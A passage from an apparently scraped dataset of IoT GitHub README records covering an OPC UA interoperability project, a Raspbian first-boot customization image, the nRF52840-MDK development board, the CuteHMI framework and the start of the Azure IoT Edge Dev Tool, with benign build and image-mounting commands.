process behavior to recover unavailable data and ensure a safe testing environment\nresource monitoring - allowing to add information processing and networking infrastructure to be exposed consistently aggregated with the process replica\nserver to server interactions - supports a scenario in which po is the client of a server\nthe po concept has been implemented as a generic communication engine used by the cas commserver classic and unified architecture servers. this implementation is optimized for highly distributed applications. this implementation is maintained in the mpostol/processobserver repository.\ncommserver\ncommserver is a package of software to manage data transfer using opc standards. built-in technologies and algorithms support machine to machine (m2m) meaningful interoperability. the commserver was written by cas lodz poland.\nthe github repository commsvr-com/migration2os is aimed at the commserver software migration from on-premise subversion repository to github and publishing it as the open-source software (oss). the members of the commserver family are to be converged with the object-oriented internet paradigms and integrated with the solutions maintained in this repository.\nobject oriented internet reactive networking configuration editor\nopc-ua-ooi.configeditor is a package of software to manage the configuration of the reactive communication. the opc-ua-ooi.configeditor was written by cas lodz poland. the mpostol/opc-ua-ooi.configeditor repository is aimed at the software migration from on-premise subversion repository to github and publishing it as the open-source software (oss). after migration, this repository will be used to manage all activities addressing the software maintenance process as a plug-in of the asmd.\nhow to cite the software and associated documentation files\nto be compliant with the license of the repository the below copyright notice shall be included in all copies or substantial portions of the software and associated documentation files (the \"software\").\ncopyright (c) 2020 mariusz postol\nin this section, you will learn how to cite the \"software\" using the doi number. a doi number is a unique identifying number for the software version. because this repository has a doi, use the doi in your citation for the article or any derived work, like this:\nmariusz postol, object oriented internet: [target part name], https://github.com/mpostol/opc-ua-ooi, [year] doi: 10.5281/zenodo.1198852.\nor\nmariusz postol, object oriented internet: [target part name], https://github.com/mpostol/opc-ua-ooi, [year] doi: http://doi.org/10.5281/zenodo.1198852.\nreplace [year] with the current year and [target part name] with the name (or names) of the files you are referring to.\nhow to follow up?\ngithub offers discussions as a space to connect with other members of the community. i hope that using the discussion space you:\nask questions you\u2019re wondering about\nshare ideas\nengage with other community members\nwelcome others and are open-minded; remember that this is a community we build together\ni have activated the discussion space for this repository. follow the discussion to be in touch.\nto follow any activity in the repository, switch on the watch functionality. if you find the project interesting, please star the repository. starring a repository also shows appreciation to the repository maintainer for their work. you can star repositories and topics to keep track of projects you find interesting and discover related content in your news feed. check out saving repositories with stars to get more.\nconclusion\ni hope it is a good place to prototype and converge the opc ua communication technology with semantic-data, industry 4.0, internet of things, data oriented architecture, plug and play, global data discovery, selective availability, etc. concepts. my goal is to bridge a gap between opc ua technology and industrial it application domains.\nthe presented approach is a real proposal for a new technology wave based on the existing internet infrastructure because it allows vendors to provide generic off-the-shelf products tested independently for interoperability.\npartnership program\ni am a researcher and university associate who is passionate about applying knowledge and experience in building a machine to machine (m2m) meaningful interoperability based on opc ua. let's build it with you and for you. to join our effort and create an organizational context i have launched an open-access object-oriented internet partnership program. hence, maintenance of this repository and further development of the opc ua information model domain-specific language will be carried out under a broader concept described in the following article\nobject-oriented internet partnership program\nconsider joining. visit the section how to be involved to get more. i hope that thanks to this partnership program we will establish long-term mutually beneficial cooperation. your participation is needed to make sure that the work will continue as expected. as a rule of thumb, the work priority is derived from community feedback.\ni strongly encourage community participation and contribution to this project. first, please fork the repository and commit your changes there. once happy with your changes you can generate a 'pull request'.\nwhen contributing to this repository, please first discuss the change you wish to make via issue, email, or any other method with the owners of this repository before making a change.\nplease note we have a code of conduct, please follow it in all your interactions with the project.\nsee also\npublications\nobject-oriented internet this playlist on youtube addresses research results on the systematic approach to the design of the meaningful machine to machine (m2m) communication targeting distributed mobile applications in the context of new emerging disciplines, i.e. industry 4.0 and internet of things.\npost\u00f3\u0142 m., szymczak p. (2021) object-oriented internet cloud interoperability. in: paszynski m., kranzlm\u00fcller d., krzhizhanovskaya v.v., dongarra j.j., sloot p.m. (eds) computational science \u2013 iccs 2021. iccs 2021. lecture notes in computer science, vol 12745. springer, cham. https://doi.org/10.1007/978-3-030-77970-2_43\navailable on researchgate\niccs 2021: international conference on computational presentation is available on youtube\npost\u00f3\u0142 m. (2020) object-oriented internet reactive interoperability. in: krzhizhanovskaya v. et al. (eds) computational science \u2013 iccs 2020. iccs 2020. lecture notes in computer science, vol 12141. springer, cham; doi: https://doi.org/10.1007/978-3-030-50426-7_31\npost\u00f3\u0142 m. (2020) object-oriented internet reactive interoperability, presentation, doi: 10.13140/rg.2.2.33984.56323\nmariusz postol, machine to machine semantic-data based communication: comprehensive survey chapter in book computer game innovations 2018, publisher: lodz university of technology press; isbn: 978-83-7283-999-2\nebook object oriented internet contains description of this project - it is auto-generated content gathered from *.md files\nmariusz postol, object oriented internet, 3rd international conference on innovative network systems and applications, 2015, ieee xplore digital library\nrelated documents\nobject-oriented internet partnership program\nhow to be involved\nwiki of this project\napi browser (is available for sponsors - consider joining)\nopc ua address space model designer (asmd)\nmy blog: about enablers of future solutions\nopc unified architecture \u2013 main technological features\nabout me on linkedin\nreferences - this section contains links to selected internal and external resources.\nrelated websites\nopc foundation\nsponsored by commsvr.com", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000476, "year": null}, {"Unnamed: 0": 479, "autor": 479, "date": null, "content": "raspberian-firstboot\nA lightly modified Raspbian-light image with first boot customization.\nOur goal is easy boot time customization of the standard Raspberry Pi OS - just edit a simple bash script.\nDownload the image from the Releases tab.\nWhy would I use this image?\nThe standard Raspbian-lite image allows you to customize the wireless settings and enable SSHd before flashing it to an SD card. Unfortunately, there is no way to further customize the OS during the first boot, nothing like cloud-init or userdata. Without a display and keyboard, complex \"headless\" deployments are impossible.\nWith this image, you can run a custom script on first boot and:\nSet a unique hostname. (simple example)\nConfigure HDMI, audio, and network settings. (example)\nInstall apt software packages. (example)\nSetup an automatic reverse SSH tunnel for remote management. (example)\nBootstrap a configuration management tool like Ansible/Chef/Puppet to prevent configuration drift.\nDeploy your IoT fleet with custom UUIDs and configurations.\nQuick Start\nThere are two ways to use the image, pick one:\nA. Download the image, customize the image with firstboot scripts, then flash the customized image to your SD card.\nB. Download the image, flash the image to your SD card, then customize the SD card with firstboot scripts.\nQuick Start A\nDownload the latest image from the Releases tab. Note we currenlty only support the raspbian-lite image.\nMount the /boot volume OF THE IMAGE YOU JUST DOWNLOADED. This usually happens automatically if you \"open\" the image on Windows, MacOS, or Linux.\nNOTE: references below to /mnt will be /Volumes on macos and under \"My Computer\" on Windows.\nCreate a /mnt/boot/firstboot.sh script with your custom contents examples here.\nOptionally add additional custom configuration files or small binaries to /mnt/boot (the /boot partiton is small - keep your total additions under ~160MB).\nRemember, you can also add a /mnt/boot/wpa_supplicant.conf file for wifi configuration.\nUnmount the /boot volume: umount /mnt on linux, diskutil unmount /Volumes/boot on macos, right-click for Windows.\nFlash the customized image to your SD card. We recommend using Balena Etcher for writing images on all platforms. Folks have run into issues with the official Raspberry Pi Imager.\nBoot your Pi... /boot/firstboot.sh will be executed and renamed to /boot/firstboot.sh.done.\nQuick Start B\nDownload the latest image from the Releases tab. Note we currenlty only support the raspbian-lite image.\nFlash the downloaded image to your SD card. We recommend using Balena Etcher for writing images on all platforms. Folks have run into issues with the official Raspberry Pi Imager.\nMount the /boot volume OF YOUR THE SD CARD YOU JUST FLASHED. This usually happens automatically if you \"open\" the SD card volume on Windows, MacOS, or Linux.\nNOTE: references below to /mnt will be /Volumes on macos and under \"My Computer\" on Windows.\nCreate a /mnt/boot/firstboot.sh script with your custom contents examples here.\nOptionally add additional custom configuration files or small binaries to /mnt/boot (the /boot partiton is small - keep your total additions under ~160MB).\nRemember, you can also add a /mnt/boot/wpa_supplicant.conf file for wifi configuration.\nUnmount the /boot volume: umount /mnt on linux, diskutil unmount /Volumes/boot on macos, right-click for Windows.\nBoot your Pi... /boot/firstboot.sh will be executed and renamed to /boot/firstboot.sh.done.\nWhat changes were made to the standard Raspbian-lite image?\nfirstboot.service is installed in /lib/systemd/system/firstboot.service\nfirstboot.service is enabled: cd /etc/systemd/system/multi-user.target.wants && ln -s /lib/systemd/system/firstboot.service .\nNothing else!\nHow to reproduce this image yourself\nNote: these are the steps used to produce the images in the Releases section of this repo. Once you have created a generic image with these steps, you can proceed to customize it by following the Quick Start.\nThis requires modifying the second partition of the Raspbian image, which requires Linux for ext4 support.\nSource image is obtained from the official Raspberry Pi download page.\nBe sure to verify the SHA hash!\nMount the second partition of the source image - the mount command will require an --offset flag, as described here.\nNote: the mount_offset_tool helps calculate the --offset on linux.\nExample usage (thanks @tgelite):\n$ cd mount_offset_tool/\n$ go run main.go /media/share/2021-01-11-raspios-buster-armhf-lite.img\n/media/share/2021-01-11-raspios-buster-armhf-lite.img1 mount command:\nmount -v -o offset=4194304,loop /media/share/2021-01-11-raspios-buster-armhf-lite.img /mnt\n/media/share/2021-01-11-raspios-buster-armhf-lite.img2 mount command:\nmount -v -o offset=272629760,loop /media/share/2021-01-11-raspios-buster-armhf-lite.img /mnt\n* Alternatively, you can mount it with `guestmount` (thanks @bastien-roucaries):\n$ guestmount -v -a 2021-01-11-raspios-buster-armhf-lite-firstboot.img -m /dev/sda2 -m /dev/sda1:/boot /mnt\nlater, unmount with: $ guestunmount /mnt\nInstall firstboot.service in /mnt/lib/systemd/system/firstboot.service\nEnable firstboot.service for systemd: cd /mnt/etc/systemd/system/multi-user.target.wants && ln -s /lib/systemd/system/firstboot.service .\nUnmount the second partition of the source image.\nCarefully test & validate the image before distributing!", "link": "https://github.com/nmcclain/raspberian-firstboot", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "raspberian-firstboot\na lightly modified raspbian-light image with first boot customization.\nour goal is easy boot time customization of the standard raspberry pi os - just edit a simple bash script.\ndownload the image from the releases tab.\nwhy would i use this image?\nthe standard raspbian-lite image allows you to customize the wireless settings and enable sshd before flashing it to an sd card. unfortunately, there is no way to further customize the os during the first boot, nothing like cloud-init or userdata. without a display and keyboard, complex \"headless\" deployments are impossible.\nwith this image, you can run a custom script on first boot and:\nset a unique hostname. (simple example)\nconfigure hdmi, audio, and network settings. (example)\ninstall apt software packages. (example)\nsetup an automatic reverse ssh tunnel for remote management. (example)\nbootstrap a configuration management -----> tool !!!  like ansible/chef/puppet to prevent configuration drift.\ndeploy your iot fleet with custom uuids and configurations.\nquick start\nthere are two ways to use the image, pick one:\na. download the image, customize the image with firstboot scripts, then flash the customized image to your sd card.\nb. download the image, flash the image to your sd card, then customize the sd card with firstboot scripts.\nquick start a\ndownload the latest image from the releases tab. note we currenlty only support the raspbian-lite image.\nmount the /boot volume of the image you just downloaded. this usually happens automatically if you \"open\" the image on windows, macos, or linux.\nnote: references below to /mnt will be /volumes on macos and under \"my computer\" on windows.\ncreate a /mnt/boot/firstboot.sh script with your custom contents examples here.\noptionally add additional custom configuration files or small binaries to /mnt/boot (the /boot partiton is small - keep your total additions under ~160mb).\nremember, you can also add a /mnt/boot/wpa_supplicant.conf file for wifi configuration.\nunmount the /boot volume: umount /mnt on linux, diskutil unmount /volumes/boot on macos, right-click for windows.\nflash the customized image to your sd card. we recommend using balena etcher for writing images on all platforms. folks have run into issues with the official raspberry pi imager.\nboot your pi... /boot/firstboot.sh will be executed and renamed to /boot/firstboot.sh.done.\nquick start b\ndownload the latest image from the releases tab. note we currenlty only support the raspbian-lite image.\nflash the downloaded image to your sd card. we recommend using balena etcher for writing images on all platforms. folks have run into issues with the official raspberry pi imager.\nmount the /boot volume of your the sd card you just flashed. this usually happens automatically if you \"open\" the sd card volume on windows, macos, or linux.\nnote: references below to /mnt will be /volumes on macos and under \"my computer\" on windows.\ncreate a /mnt/boot/firstboot.sh script with your custom contents examples here.\noptionally add additional custom configuration files or small binaries to /mnt/boot (the /boot partiton is small - keep your total additions under ~160mb).\nremember, you can also add a /mnt/boot/wpa_supplicant.conf file for wifi configuration.\nunmount the /boot volume: umount /mnt on linux, diskutil unmount /volumes/boot on macos, right-click for windows.\nboot your pi... /boot/firstboot.sh will be executed and renamed to /boot/firstboot.sh.done.\nwhat changes were made to the standard raspbian-lite image?\nfirstboot.service is installed in /lib/systemd/system/firstboot.service\nfirstboot.service is enabled: cd /etc/systemd/system/multi-user.target.wants && ln -s /lib/systemd/system/firstboot.service .\nnothing else!\nhow to reproduce this image yourself\nnote: these are the steps used to produce the images in the releases section of this repo. once you have created a generic image with these steps, you can proceed to customize it by following the quick start.\nthis requires modifying the second partition of the raspbian image, which requires linux for ext4 support.\nsource image is obtained from the official raspberry pi download page.\nbe sure to verify the sha hash!\nmount the second partition of the source image - the mount command will require an --offset flag, as described here.\nnote: the mount_offset_tool helps calculate the --offset on linux.\nexample usage (thanks @tgelite):\n$ cd mount_offset_tool/\n$ go run main.go /media/share/2021-01-11-raspios-buster-armhf-lite.img\n/media/share/2021-01-11-raspios-buster-armhf-lite.img1 mount command:\nmount -v -o offset=4194304,loop /media/share/2021-01-11-raspios-buster-armhf-lite.img /mnt\n/media/share/2021-01-11-raspios-buster-armhf-lite.img2 mount command:\nmount -v -o offset=272629760,loop /media/share/2021-01-11-raspios-buster-armhf-lite.img /mnt\n* alternatively, you can mount it with `guestmount` (thanks @bastien-roucaries):\n$ guestmount -v -a 2021-01-11-raspios-buster-armhf-lite-firstboot.img -m /dev/sda2 -m /dev/sda1:/boot /mnt\nlater, unmount with: $ guestunmount /mnt\ninstall firstboot.service in /mnt/lib/systemd/system/firstboot.service\nenable firstboot.service for systemd: cd /mnt/etc/systemd/system/multi-user.target.wants && ln -s /lib/systemd/system/firstboot.service .\nunmount the second partition of the source image.\ncarefully test & validate the image before distributing!", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000479, "year": null}, {"Unnamed: 0": 481, "autor": 481, "date": null, "content": "nRF52840-MDK\nAn Open-Source, Micro Development Kit for IoT Applications using the nRF52840 SoC\nDescription\nThe nRF52840-MDK is a versatile, easy-to-use IoT hardware platform for Bluetooth 5, Bluetooth Mesh, Thread, IEEE 802.15.4, ANT and 2.4GHz proprietary applications using the nRF52840 SoC.\nThe development kit comes with a fully integrated debugger (also known as DAPLink) that provides USB drag-and-drop programming, USB Virtual COM port and CMSIS-DAP interface.\nThe kit contains a Microchip USB 2.0 Hi-Speed hub controller with two downstream ports: one for DAPLink interface and one for nRF52840 USB device controller. The kit also features ultra-low power 64-Mb QSPI FLASH memory, programmable user button, RGB LED, up to 24 GPIOs, antenna selection for custom applications.\nIt supports the standard Nordic Software Development Tool-chain using GCC, Keil and IAR. It can also be used to play with many popular frameworks, such as nRF5 SDK, nRF5 SDK for Mesh, OpenThread, ZigBee 3.0, Mbed OS 5, Zephyr, Mynewt, Web Bluetooth, iBeacon, Eddystone, and more.\nHardware Features\nNordic nRF52840 System-on-Chip\nARM\u00ae Cortex\u00ae-M4F processor optimized for ultra-low power operation\nCombining Bluetooth 5, Bluetooth Mesh, Thread, IEEE 802.15.4, ANT and 2.4GHz proprietary\nOn-chip NFC-A tag\nOn-chip USB 2.0 (Full speed) controller\nARM TrustZone\u00ae Cryptocell 310 security subsystem\n1 MB FLASH and 256 kB RAM\nProgram/Debug options with DAPLink\nMSC - drag-n-drop programming flash memory\nCDC - virtual com port for log, trace and terminal emulation\nHID - CMSIS-DAP compliant debug channel\nWEBUSB HID - CMSIS-DAP compliant debug channel\nMicrochip 2-Port USB 2.0 Hi-Speed Hub Controller\nExternal ultra-low power 64-Mb QSPI FLASH memory\nUp to 24 GPIOs available via headers\nIF Boot/Reset Button\nUser programmable Button and RGB LED\nOn-board 2.4G chip antenna\nU.FL connector selectable for external antenna\n3.3V regulator with 1A peak current output\nVBUS & VIN Power-Path Management\nReversible USB 3.1 Type-C Connector\nBreadboard-friendly with dual 18-Pin headers\nMeasures 1.97\" x 0.9\" x 0.51\" (50mm x 23mm x 13mm) with headers soldered in\nPinout Diagram\nDocumentation\nWe have provided develeopment docs to make it a pleasure to work with nRF52840-MDK. Get what you need here or visit https://wiki.makerdiary.com/nrf52840-mdk.\nGetting Started\nUsing nRF5 SDK\nUsing nRF5 SDK for Mesh\nUsing OpenThread\nUsing Arm Mbed OS\nUsing Zephyr\nUsing Mynewt\nUsing DAPLink\nSoftware Resource\nThe nRF52840 Micro Dev Kit USB Dongle can be used to play with : nRF5 SDK, OpenThread, Web Bluetooth, iBeacon, Eddystone, and more.\nSoftware Brief Description\nnRF5 SDK Offical Software Development Kit for nRF51 and nRF52 Series\nOpenThread Border Router An open source border router, designed to work with OpenThread\nThread Network Sniffer Help you to efficiently analyze Thread network traffic\nWeb Bluetooth Bluetooth support for the Web\niBeacon A Bluetooth low energy advertising message format designed by Apple\nEddystone A protocol specification that defines a Bluetooth low energy message format for proximity beacon messages\nCircuitPython A Python language for microcontrollers designed to simplify experimentation and learning\nTinyGo Go compiler for small devices, based on LLVM\nRust for nrf52840-mdk Rust support for the nrf52840-mdk development board\nRIOT OS The friendly Operating System for the Internet of Things,\nHardware Resource\nReleases Design Files\nV1.0 nRF52840-MDK V1.0 Pinout Diagram\nnRF52840-MDK V1.0 Schematic\nnRF52840-MDK V1.0 Board File\nnRF52840-MDK V1.0 3D STEP\nHow to get nRF52840-MDK\nnRF52840-MDK is available on the following channels (click to go directly to the product):\nContributing\nWe would love for you to contribute to this project and help make it even better than it is today! See our Contributing Guidelines for more information.\nLicense\nMIT License\nCopyright (c) 2019 makerdiary.com\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.", "link": "https://github.com/makerdiary/nrf52840-mdk", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "nrf52840-mdk\nan open-source, micro development kit for iot applications using the nrf52840 soc\ndescription\nthe nrf52840-mdk is a versatile, easy-to-use iot hardware platform for bluetooth 5, bluetooth mesh, thread, ieee 802.15.4, ant and 2.4ghz proprietary applications using the nrf52840 soc.\nthe development kit comes with a fully integrated debugger (also known as daplink) that provides usb drag-and-drop programming, usb virtual com port and cmsis-dap interface.\nthe kit contains a microchip usb 2.0 hi-speed hub controller with two downstream ports: one for daplink interface and one for nrf52840 usb device controller. the kit also features ultra-low power 64-mb qspi flash memory, programmable user button, rgb led, up to 24 gpios, antenna selection for custom applications.\nit supports the standard nordic software development -----> tool !!! -chain using gcc, keil and iar. it can also be used to play with many popular frameworks, such as nrf5 sdk, nrf5 sdk for mesh, openthread, zigbee 3.0, mbed os 5, zephyr, mynewt, web bluetooth, ibeacon, eddystone, and more.\nhardware features\nnordic nrf52840 system-on-chip\narm\u00ae cortex\u00ae-m4f processor optimized for ultra-low power operation\ncombining bluetooth 5, bluetooth mesh, thread, ieee 802.15.4, ant and 2.4ghz proprietary\non-chip nfc-a tag\non-chip usb 2.0 (full speed) controller\narm trustzone\u00ae cryptocell 310 security subsystem\n1 mb flash and 256 kb ram\nprogram/debug options with daplink\nmsc - drag-n-drop programming flash memory\ncdc - virtual com port for log, trace and terminal emulation\nhid - cmsis-dap compliant debug channel\nwebusb hid - cmsis-dap compliant debug channel\nmicrochip 2-port usb 2.0 hi-speed hub controller\nexternal ultra-low power 64-mb qspi flash memory\nup to 24 gpios available via headers\nif boot/reset button\nuser programmable button and rgb led\non-board 2.4g chip antenna\nu.fl connector selectable for external antenna\n3.3v regulator with 1a peak current output\nvbus & vin power-path management\nreversible usb 3.1 type-c connector\nbreadboard-friendly with dual 18-pin headers\nmeasures 1.97\" x 0.9\" x 0.51\" (50mm x 23mm x 13mm) with headers soldered in\npinout diagram\ndocumentation\nwe have provided develeopment docs to make it a pleasure to work with nrf52840-mdk. get what you need here or visit https://wiki.makerdiary.com/nrf52840-mdk.\ngetting started\nusing nrf5 sdk\nusing nrf5 sdk for mesh\nusing openthread\nusing arm mbed os\nusing zephyr\nusing mynewt\nusing daplink\nsoftware resource\nthe nrf52840 micro dev kit usb dongle can be used to play with : nrf5 sdk, openthread, web bluetooth, ibeacon, eddystone, and more.\nsoftware brief description\nnrf5 sdk offical software development kit for nrf51 and nrf52 series\nopenthread border router an open source border router, designed to work with openthread\nthread network sniffer help you to efficiently analyze thread network traffic\nweb bluetooth bluetooth support for the web\nibeacon a bluetooth low energy advertising message format designed by apple\neddystone a protocol specification that defines a bluetooth low energy message format for proximity beacon messages\ncircuitpython a python language for microcontrollers designed to simplify experimentation and learning\ntinygo go compiler for small devices, based on llvm\nrust for nrf52840-mdk rust support for the nrf52840-mdk development board\nriot os the friendly operating system for the internet of things,\nhardware resource\nreleases design files\nv1.0 nrf52840-mdk v1.0 pinout diagram\nnrf52840-mdk v1.0 schematic\nnrf52840-mdk v1.0 board file\nnrf52840-mdk v1.0 3d step\nhow to get nrf52840-mdk\nnrf52840-mdk is available on the following channels (click to go directly to the product):\ncontributing\nwe would love for you to contribute to this project and help make it even better than it is today! see our contributing guidelines for more information.\nlicense\nmit license\ncopyright (c) 2019 makerdiary.com\npermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"software\"), to deal in the software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the following conditions:\nthe above copyright notice and this permission notice shall be included in all copies or substantial portions of the software.\nthe software is provided \"as is\", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. in no event shall the authors or copyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in connection with the software or the use or other dealings in the software.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000481, "year": null}, {"Unnamed: 0": 482, "autor": 482, "date": null, "content": "CuteHMI\nCuteHMI is an open-source HMI (Human Machine Interface) software written in C++ and QML, using Qt libraries as a framework.\nCuteHMI is essentially a collection of libraries, plugins and executables, referred to as \"extensions\" and \"tools\", glued together by Qbs components. To create custom project one creates his own first-class extension, which may depend on any number of other extensions and uses specific tool to load its components. This makes CuteHMI very flexible framework with many use cases.\nNote: While most of the project uses GNU Lesser General Public License version 3, some files are distributed under different licenses.\nBranches\nConsecutive branch numbers denote successive iterations of the project. Iteration of the project is related to build framework (repository layout and Qbs items). Extensions and tools are versioned independently and they have their own development status.\nBranch \"master\" is a development branch. Development branch may contain source code that is undergoing deep changes, rendering it unusable. Branch \"master\" is merged frequently into a branch, which has \"alpha\" status. This branch may also undergo deep modifications, but it should be usable. Branches with \"perpetual beta\" status are stable in a sense that no backward incompatible changes shall be made to them. For new projects it is recommended to use \"alpha\" branch. By the time the project is finished branch should also stabilize.\nBranch Build status Development status\nmaster pre-alpha\n5 alpha\n4 perpetual beta\nCompiling\nGet the Qt toolkit. Open-source and commercial editions can be obtained from https://www.qt.io/. Qt can also be shipped with Linux distribution.\nOpen CuteHMI.qbs file with QtCreator and simply build it.\nAll extensions dependent on external libraries will be disabled, if these libraries could not be found. To make the process of finding the libraries and installing them under Windows easier, a set of Makefiles is provided, which allows the libraries to be build from sources. Check out external libraries for more details. Each extension may provide individual documentation on how to build it.\nRemember that Qbs caches Probe items' results, so if the library is installed after the project has been configured with Qbs, it will not show up. You can use --force-probe-execution option to force Qbs to not use cached results.\nBuilding only specified products\nBy default Qbs will compile all the products (tools and extension), even if they are not needed for a project. To build only specific product use --products | -p build option. For example following command will build only CuteHMI.Examples.SimpleView.2 extension and its dependencies, using default configuration.\nqbs -f CuteHMI.qbs -p CuteHMI.Examples.SimpleView.2\nFind out more about build options on Qbs documentation website.\nGetting started\nFor an introduction you may want to run one of the existing examples. In CuteHMI everything is either a tool or an extension, therefore examples are also provided as extensions. Their names start with \"CuteHMI.Examples\" prefix. The most basic example CuteHMI.Examples.SimpleView.2 can be run with cutehmi.view.4 tool by issuing following command.\ncutehmi.view.4 CuteHMI.Examples.SimpleView.2\nTo create your own project you can simply copy one of the examples to your own subdirectory in extensions directory (e.g. Me/MyExtension.0) and edit project.qbs file. Change name property to match extension name (e.g. name: \"Me.MyExtension.0\")\nAfter that you can use --force-probe-execution Qbs option or delete build directory and rebuild whole project. Your extension should be installed and it can be run with cutehmi.view.4 tool.\ncutehmi.view.4 Me.MyExtension.0\nMore methodical approach is to use one of the templates. The process of creating custom extensions is described in more detail here.\nExamples are listed in the documentation along with other extensions.\nInternals\nDirectory structure of the project is organized as follows.\n_sass, _layouts - directories used by GitHub Pages.\nawkgward - code maintanance scripts (don't bother).\ndev - development notes (irrelevant).\ndoc - a place where documentation shall be.\nextensions - libraries and QML extensions.\nexternal - directory containing \"external\" libraries.\nextra - various stuff related to the project, such as T-shirts.\nqbs - Qbs modules and imports.\ntools - executable programs.\nTwo most important directories are extensions and tools. Extensions combine functionality of QML extensions and standard libraries. They can be utilized by end-user applications, but they can be also linked with each other. Some extensions may depend on external libraries.\nQuick links\nRepository\nWebsite\nDocumentation", "link": "https://github.com/michpolicht/CuteHMI", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "cutehmi\ncutehmi is an open-source hmi (human machine interface) software written in c++ and qml, using qt libraries as a framework.\ncutehmi is essentially a collection of libraries, plugins and executables, referred to as \"extensions\" and \"tools\", glued together by qbs components. to create custom project one creates his own first-class extension, which may depend on any number of other extensions and uses specific -----> tool !!!  to load its components. this makes cutehmi very flexible framework with many use cases.\nnote: while most of the project uses gnu lesser general public license version 3, some files are distributed under different licenses.\nbranches\nconsecutive branch numbers denote successive iterations of the project. iteration of the project is related to build framework (repository layout and qbs items). extensions and tools are versioned independently and they have their own development status.\nbranch \"master\" is a development branch. development branch may contain source code that is undergoing deep changes, rendering it unusable. branch \"master\" is merged frequently into a branch, which has \"alpha\" status. this branch may also undergo deep modifications, but it should be usable. branches with \"perpetual beta\" status are stable in a sense that no backward incompatible changes shall be made to them. for new projects it is recommended to use \"alpha\" branch. by the time the project is finished branch should also stabilize.\nbranch build status development status\nmaster pre-alpha\n5 alpha\n4 perpetual beta\ncompiling\nget the qt toolkit. open-source and commercial editions can be obtained from https://www.qt.io/. qt can also be shipped with linux distribution.\nopen cutehmi.qbs file with qtcreator and simply build it.\nall extensions dependent on external libraries will be disabled, if these libraries could not be found. to make the process of finding the libraries and installing them under windows easier, a set of makefiles is provided, which allows the libraries to be build from sources. check out external libraries for more details. each extension may provide individual documentation on how to build it.\nremember that qbs caches probe items' results, so if the library is installed after the project has been configured with qbs, it will not show up. you can use --force-probe-execution option to force qbs to not use cached results.\nbuilding only specified products\nby default qbs will compile all the products (tools and extension), even if they are not needed for a project. to build only specific product use --products | -p build option. for example following command will build only cutehmi.examples.simpleview.2 extension and its dependencies, using default configuration.\nqbs -f cutehmi.qbs -p cutehmi.examples.simpleview.2\nfind out more about build options on qbs documentation website.\ngetting started\nfor an introduction you may want to run one of the existing examples. in cutehmi everything is either a tool or an extension, therefore examples are also provided as extensions. their names start with \"cutehmi.examples\" prefix. the most basic example cutehmi.examples.simpleview.2 can be run with cutehmi.view.4 tool by issuing following command.\ncutehmi.view.4 cutehmi.examples.simpleview.2\nto create your own project you can simply copy one of the examples to your own subdirectory in extensions directory (e.g. me/myextension.0) and edit project.qbs file. change name property to match extension name (e.g. name: \"me.myextension.0\")\nafter that you can use --force-probe-execution qbs option or delete build directory and rebuild whole project. your extension should be installed and it can be run with cutehmi.view.4 tool.\ncutehmi.view.4 me.myextension.0\nmore methodical approach is to use one of the templates. the process of creating custom extensions is described in more detail here.\nexamples are listed in the documentation along with other extensions.\ninternals\ndirectory structure of the project is organized as follows.\n_sass, _layouts - directories used by github pages.\nawkgward - code maintanance scripts (don't bother).\ndev - development notes (irrelevant).\ndoc - a place where documentation shall be.\nextensions - libraries and qml extensions.\nexternal - directory containing \"external\" libraries.\nextra - various stuff related to the project, such as t-shirts.\nqbs - qbs modules and imports.\ntools - executable programs.\ntwo most important directories are extensions and tools. extensions combine functionality of qml extensions and standard libraries. they can be utilized by end-user applications, but they can be also linked with each other. some extensions may depend on external libraries.\nquick links\nrepository\nwebsite\ndocumentation", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000482, "year": null}, {"Unnamed: 0": 488, "autor": 488, "date": null, "content": "Azure IoT Edge Dev Tool\nThe IoT Edge Dev Tool greatly simplifies Azure IoT Edge development down to simple commands driven by environment variables.\nIt gets you started with IoT Edge development with the IoT Edge Dev Container and IoT Edge solution scaffolding that contains a default module and all the required configuration files.\nIt speeds up your inner-loop dev (dev, debug, test) by reducing multi-step build & deploy processes into one-line CLI commands as well as drives your outer-loop CI/CD pipeline. You can use all the same commands in both stages of your development life-cycle.\nOverview\nFor the absolute fastest way to get started with IoT Edge Dev, please see the Quickstart section below.\nFor a more detailed overview of IoT Edge Dev Tool including setup and commands, please see the Wiki.\nQuickstart\nTo set up development machines manually instead of using the IoT Edge Dev Container, please see the Manual Development Machine Setup Wiki.\nThis quickstart will run a container, create a solution, setup Azure resources, build and deploy modules to your device, setup and start the IoT Edge simulator, monitor messages flowing into IoT Hub, and finally deploy to the IoT Edge runtime.\nThe only thing you need to install is Docker. All of the other dev dependencies are included in the 